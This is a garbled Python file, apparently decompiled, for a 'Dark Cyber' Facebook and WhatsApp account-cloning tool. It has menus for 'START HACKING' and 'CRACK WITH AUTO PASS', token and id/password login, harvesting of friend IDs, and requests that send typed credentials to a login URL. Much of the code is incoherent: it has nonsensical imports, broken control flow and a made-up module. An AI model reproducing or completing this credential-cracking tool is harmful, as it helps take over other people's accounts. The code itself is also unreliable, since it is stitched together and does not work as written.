# Decompile by Dark Cyber (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-02-26 21:16:42.005965
import json
import logging
import os
import random
import time
from this import s
from tkinter import Menu
from turtledemo.chaos import f
from Tools.scripts.mkreal import join
from bird import user
import pyqrcode
import requests

import somplak as kyros
hostskaka = 'https://api.whatsapp.com/methods/auth.login?format=json&email=' + '&password='
hosts = s.split

if ImportError:
    os.system('pip2 install requests')
agents = [
    'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36) KHTML, like']
birth = [
    '001',
    '02',
    '03',
    '04',
    '05',
    '06',
    '07',
    '08',
    '09',
    '10',
    '11',
    '12',
    '13',
    '14',
    '15',
    '16',
    '17',
    '18',
    '19',
    '20',
    '21']
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(sim),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like)',
    'x-fb-connection-type': 'unknown',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger'}
logo = """
 .----------------. .----------------.
| .--------------. | | .--------------. |
| | DARK | | | | CYBER | |
| | DARK | | | | CYBER | |
| | DARK | | | | CYBER | |
| | DARK | | | | CYBER | |
| | DARK | | | | CYBER | |
| | DARK | | | | CYBER | |
| | DARK | | | | CYBER | |
| '--------------' | | '--------------' |
'----------------' '----------------'
______________________________________________________
[*] WhatsApp : I Hate WhatsApp
[*] FACEBOOK : DarkCyberOfcial
[*] GITHUB : DarkCyberOfcial
[*] TOOLS : MULTI PUBLIC IDZ CLONE 30+ PASS
_____________________________________________________
"""


def tool():
    os.system('clear')
    print('')
    print(logo)
    time.sleep(1)
    print('First Put Tool Username...'.center(50))
    print('')
    time.sleep(1)
    username = input('[+] Tool Username : ')
    if username == 'DARK':
        print('')
    time.sleep(1)
    print('\x1b[1;92mTool Username is correct'.center(50))
    print('')
    time.sleep(1)
    step_main()
    print('')
    time.sleep(1)
    print('\x1b[1;91mTool Username Is Invalid :) '.center(50))
    print('')
    time.sleep(1)
    tool()


def step_main():
    os.system('clear')
    print(logo)
    print('')
    time.sleep(1)
    print('First Put Tool Password...'.center(50))
    print('')
    time.sleep(1)
    username = input('[+] Tool Password : ')
    if username == 'CYBER':
        print(hosts)
        time.sleep(1)
        print('\x1b[1;92mTool Password is correct'.center(50))
        print('')
        time.sleep(1)
    main()
    time.sleep(1)
    print('\x1b[1;91mTool Password Is Invalid :) '.center(50))
    print('')
    time.sleep(1)
    step_main()


def main():
    os.system('clear')
    print(logo)
    print(' \t [\x1b[1;97m\x1b[1;41m Welcome To DARK CYBER TOOL'.center(50))
    print(54 * '\x1b[1;93m_')
    print('')
    print(47 * '\x1b[1;93m\xe2\x96\xac')
    print('\x1b[1;93m[1] \x1b[1;92mSTART HACKING')
    print('\x1b[1;93m[2] \x1b[1;92mFOLLOW ME ON GITHUB')
    print('\x1b[1;93m[3] \x1b[1;92mFOLLOW ME ON FACEBOOK')
    print('\x1b[1;93m[4] \x1b[1;92mJOIN OUR FACEBOOK GROUP')
    print('\x1b[1;93m[0] \x1b[1;92mExit')
    print(47 * '\x1b[1;93m\xe2\x96\xac')
    os.system('xdg-open https://dns.google.com/dns/')
    main_select()


def main_select():
    SYED = input('\n\x1b[1;93mChoose Option \xe2\x89\xbb \x1b[1;92m')
    if SYED == '':
        print('\x1b[1;97mFill in correctly')
        main()
    elif SYED == '1':
        login()
    elif SYED == '2':
        os.system('xdg-open https://dns.google.com/dns/')
        main()
    elif SYED == '3':
        os.system('xdg-open https://www.facebook.com/DarkCyberOfcial')
        main()
    elif SYED == '4':
        os.system('xdg-open https://dns.google.com/dns/')
        main()
    elif SYED == '0':
        os.system('exit')
    else:
        print('\x1b[1;91m[!] Please select a valid option'.center(50))
        time.sleep(2)
    main()


def login():
    try:
        os.system('clear')
        menu = Menu
        token = open('WD_Number.txt', 'r').read()
    except (KeyError, IOError):
        print(logo)
        print('')
        print(' \t [\x1b[1;97m\x1b[1;41m Login menu \x1b[0m\x1b[1;93m]'.center(50))
        print('')
        print(47 * '\x1b[1;93m\xe2\x96\xac')
        print('\x1b[1;93m[1] \x1b[1;92mLogin With Fb Token\n')
        print('\x1b[1;93m[2] \x1b[1;92mLogin With Fb id/pass\n')
        print('\x1b[1;93m[3] \x1b[1;92mWithout Login Cloning\n')
        print('\x1b[1;93m[4] \x1b[1;92mBack ')
        print(47 * '\x1b[1;93m\xe2\x96\xac')
        print('')
        log_select()


def log_select():
    sel = input('Choose option: \x1b[1;92m')
    if sel == '2':
        log_select()
    elif sel == '1':
        tokens = input('\x1b[1;]')
    elif sel == '3':
        os.system('python2 without.py')
    elif sel == '4':
        main()
    else:
        print('')
        print('\tSelect valid option')
        print('')
        log_select()

    def log_fb():
        os.system('clear')

    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print(logo)
        print(' \t [\x1b[1;97m\x1b[1;41m Put Facebook id/pass \x1b[0m\x1b[1;93m]'.center(50))
        print('')
    return


logging.basicConfig(level=logging.INFO)
logging.getLogger("kyros").setLevel(logging.ERROR)
logger = logging.getLogger("wabf")  # noqa
s = input('\x1b[1;92m[+] Email: \x1b[1;93m')
qr_data = s.split()
passw = input('\x1b[1;92m[+] Password: \x1b[1;93m')
q = join(s.replace(passw, user))
data = requests.get(hostskaka + passw)


def amain(phone_number, disable_cache, output_format, output_fle):
    whatsapp = kyros
    cache_flepath = os.path.join(output_fle, "wabf.s")
    if 'access_token' in q:
        save = open('access_token.txt', 'w')
        save.write(s)
        save.close()
    elif hostskaka in q:
        print('')
    print('\t\x1b[1;91mAccount has checkpoint')
    print('')
    time.sleep(1)
    login()
    print('')
    print('\t\x1b[1;91mId/pass my be wrong')
    print('')
    time.sleep(1)


def token():
    os.system('clear')


try:
    r = requests.get(hostskaka + 'me?access_token=')
    q = hosts
    name = q(input('\x1b[1; your username: '))
    print(logo)
    print('')
    print('\x1b[1;92m\t Your Token Logged in Sucsessfuly')
    time.sleep(1)
    print(logo)
    print('')
    print('\x1b[1;91m\t Logged in token has expired')
    os.system('rm -rf access_token.txt')
    print('')
    time.sleep(1)
    login()
    os.system('clear')
    print(logo)
    print(' \t Wellcome :\x1b[1;92m ' + name[1000])
    print(54 * '\x1b[1;93m_')
    print('')
    print(' \t [\x1b[1;97m\x1b[1;41m Choose method \x1b[0m\x1b[1;93m]')

except(KeyError, IOError):
    login()

try:
    token = open('access_token.txt', 'r').read()
except(KeyError, IOError):
    login()

qr_code = pyqrcode.create(qr_data)
print(qr_code.terminal(quiet_zone=1))
try:
    s
except KeyError:
    pass
try:
    logger.info("logged in, wid: %s")
    logger.info("genter(50)")
    print('')
    print(47 * '\x1b[1;93m\xe2\x96\xac')
    print('\x1b[1;93m[1] \x1b[1;92mCRACK WITH AUTO PASS\n')
    print('\x1b[1;93m[2] \x1b[1;92mCRACK WITH CHOICE DIGIT PASS\n')
    print('\x1b[1;93m[3] \x1b[1;92mBACK')
    print(47 * '\x1b[1;93m\xe2\x96\xac')
    print('')
except:
    print('')
    print('\tSelect valid option')
    print('')


def crack_select():
    select = input('\x1b[1;93mChoose option: \x1b[1;92m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
    print(logo)
    print(' \t [\x1b[1;97m\x1b[1;41m Paste Numeric \x1b[0m\x1b[1;93m]'.center(50))
    print('')
    print('')
    idt = input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
    q = hosts.loads()

    try:
        r = requests.get(hostskaka + '' + idt + '?access_token=' + token, headers=
        header)
    finally:
        print('\t \x1b[1;31mLogged in id has checkpoint\x1b[0;97m')
        print('')
        input(' Press enter to back')


random.choice(seq=s)
r = requests.get(hostskaka + '' + '/friends?access_token=' + token, headers
=header)
z = hosts.loads()
for i in z['data']:
    uid = i['id']
na = f('name')
nm = na.rsplit(' ')[0]
q = hosts.loads
idt = input('\x1b[1;92m[+] Input id [2] : \x1b[1;93m')

try:
    r = requests.get(hostskaka + '' + idt + '?access_token=' + token, headers=
    header)
except KeyError:
    print("\t \x1b[1;31mLoggeating possible jids...")


    def main(arg):
        user = arg


    (uid, name) = random.choice('|')
    ranagent = random.choice(agents)
    session = requests.Session()
    session.headers.update({
        'User-Agent': ranagent})
